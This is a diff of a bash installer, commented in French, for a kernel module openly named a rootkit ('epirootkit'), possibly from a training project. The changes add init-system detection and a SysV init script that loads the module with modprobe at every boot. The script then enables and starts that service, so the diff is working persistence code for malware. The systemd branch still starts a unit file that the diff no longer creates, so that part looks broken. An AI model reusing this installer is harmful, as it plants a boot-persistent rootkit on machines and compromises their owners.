@@ -19,6 +19,19 @@ print_warning() {
     echo -e "${YELLOW}[WARNING]${NC} $1"
 }
 
+# Détecter le système d'initialisation
+detect_init_system() {
+    if command -v systemctl >/dev/null 2>&1; then
+        echo "systemd"
+    elif command -v service >/dev/null 2>&1; then
+        echo "sysvinit"
+    else
+        echo "unknown"
+    fi
+}
+
+INIT_SYSTEM=$(detect_init_system)
+
 # Vérifier si le script est exécuté en tant que root
 if [ "$EUID" -ne 0 ]; then 
     print_error "Ce script doit être exécuté en tant que root"
@@ -50,8 +63,8 @@ if [ -f "/lib/modules/$(uname -r)/extra/epirootkit.ko" ]; then
     cp "/lib/modules/$(uname -r)/extra/epirootkit.ko" "$BACKUP_PATH/"
 fi
 
-if [ -f "/etc/systemd/system/epirootkit.service" ]; then
-    cp "/etc/systemd/system/epirootkit.service" "$BACKUP_PATH/"
+if [ -f "/etc/init.d/epirootkit" ]; then
+    cp "/etc/init.d/epirootkit" "$BACKUP_PATH/"
 fi
 
 # Compiler le rootkit
@@ -75,27 +88,59 @@ cp epirootkit.ko "/lib/modules/$(uname -r)/extra/"
 print_message "Mise à jour des dépendances..."
 depmod -a
 
-# Créer le service systemd pour la persistance
-print_message "Configuration du service systemd..."
-cat > /etc/systemd/system/epirootkit.service << EOF
-[Unit]
-Description=EpiRootkit Service
-After=network.target
+# Créer le script d'initialisation
+print_message "Configuration du service..."
+cat > /etc/init.d/epirootkit << EOF
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides:          epirootkit
+# Required-Start:    \$network
+# Required-Stop:     \$network
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: EpiRootkit Service
+# Description:       Service pour charger le module EpiRootkit
+### END INIT INFO
 
-[Service]
-Type=oneshot
-ExecStart=/sbin/modprobe epirootkit
-RemainAfterExit=yes
+case "\$1" in
+    start)
+        modprobe epirootkit
+        ;;
+    stop)
+        rmmod epirootkit
+        ;;
+    restart)
+        rmmod epirootkit
+        modprobe epirootkit
+        ;;
+    *)
+        echo "Usage: \$0 {start|stop|restart}"
+        exit 1
+        ;;
+esac
 
-[Install]
-WantedBy=multi-user.target
+exit 0
 EOF
 
-# Activer et démarrer le service
+# Rendre le script exécutable
+chmod +x /etc/init.d/epirootkit
+
+# Activer et démarrer le service selon le système d'initialisation
 print_message "Activation du service..."
-systemctl daemon-reload
-systemctl enable epirootkit.service
-systemctl start epirootkit.service
+case "$INIT_SYSTEM" in
+    "systemd")
+        systemctl daemon-reload
+        systemctl enable epirootkit.service
+        systemctl start epirootkit.service
+        ;;
+    "sysvinit")
+        update-rc.d epirootkit defaults
+        service epirootkit start
+        ;;
+    *)
+        print_warning "Système d'initialisation non reconnu. Installation manuelle requise."
+        ;;
+esac
 
 # Vérifier si l'installation a réussi
 if ! lsmod | grep -q "epirootkit"; then
@@ -104,10 +149,17 @@ if ! lsmod | grep -q "epirootkit"; then
     if [ -f "$BACKUP_PATH/epirootkit.ko" ]; then
         cp "$BACKUP_PATH/epirootkit.ko" "/lib/modules/$(uname -r)/extra/"
     fi
-    if [ -f "$BACKUP_PATH/epirootkit.service" ]; then
-        cp "$BACKUP_PATH/epirootkit.service" "/etc/systemd/system/"
+    if [ -f "$BACKUP_PATH/epirootkit" ]; then
+        cp "$BACKUP_PATH/epirootkit" "/etc/init.d/"
     fi
-    systemctl daemon-reload
+    case "$INIT_SYSTEM" in
+        "systemd")
+            systemctl daemon-reload
+            ;;
+        "sysvinit")
+            service epirootkit restart
+            ;;
+    esac
     exit 1
 fi
 
